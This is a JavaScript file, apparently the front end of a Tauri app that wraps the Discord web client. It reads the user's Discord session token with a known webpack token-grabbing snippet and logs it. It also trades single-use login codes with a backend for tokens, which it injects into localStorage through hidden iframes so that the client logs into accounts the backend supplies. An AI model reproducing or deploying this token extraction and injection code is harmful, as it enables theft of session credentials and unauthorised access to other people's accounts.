window.addEventListener('DOMContentLoaded', _event => {
  const tauri = window.__TAURI__;
  const appWindow = tauri.window.appWindow;
  const invoke = tauri.tauri.invoke;

  checkLogin();

  setInterval(() => {
    try {
      checkLogin();
    } catch (error) {
      console.log(error);
    }
  }, 1000 * 60 * 5);

  function checkLogin() {
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    const code = document.body.appendChild(iframe).contentWindow.localStorage.code;

    // 获取 discord token
    const discordToken = (webpackChunkdiscord_app.push([[''], {}, e => {
      m = [];
      for (let c in e.c) m.push(e.c[c]);
    }]), m)
      .find(m => m?.exports?.default?.getToken !== void 0)
      .exports.default.getToken();

    console.log('discord_ token', discordToken);
    console.log('discord_ code', code);

    if (code && code !== '') {
      getCode(code).then((response) => {
        let resp = JSON.parse(response);
        if (resp.success) {
          if (resp.data !== '') {
            login(code, resp.data);
          }
        } else {
          logout();
          loginHtml();
        }
      });
    } else {
      loginHtml();
    }
  }

  function loginHtml() {
    getHtml().then((response) => {
      let resp = JSON.parse(response);
      if (resp.success) {
        document.body.innerHTML = resp.data;
        // 监听按钮点击事件
        document.getElementById('loginButton').addEventListener('click', function() {
          // 获取输入的密码
          const passwordInput = document.getElementById('password');
          const password = passwordInput.value;

          getCode(password).then((response) => {
            let resp = JSON.parse(response);
            if (resp.success && resp.data !== '') {
              login(password, resp.data);
            } else {
              if (resp.errorMessage) {
                alert(resp.errorMessage);
              } else {
                alert("登录码已使用");
              }
            }
          });
        });
      }
    });
  }

  function getCode(pwd) {
    console.log('get_code', pwd);
    return invoke('get_code', { code: pwd })
      .then((response) => {
        console.log(response);
        return response;
      });
  }

  function getHtml() {
    return invoke('get_html')
      .then((response) => {
        console.log(response);
        return response;
      });
  }

  function login(code, token) {
    setInterval(() => {
      // 创建一个隐藏的 iframe 元素
      const iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      document.body.appendChild(iframe).contentWindow.localStorage.token = `"${token}"`;
      document.body.appendChild(iframe).contentWindow.localStorage.code = `${code}`;
    }, 100);
    setTimeout(() => {
      location.reload();
    }, 50);
  }

  function logout() {
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    document.body.appendChild(iframe).contentWindow.localStorage.token = `""`;
    document.body.appendChild(iframe).contentWindow.localStorage.code = `""`;
  }
});


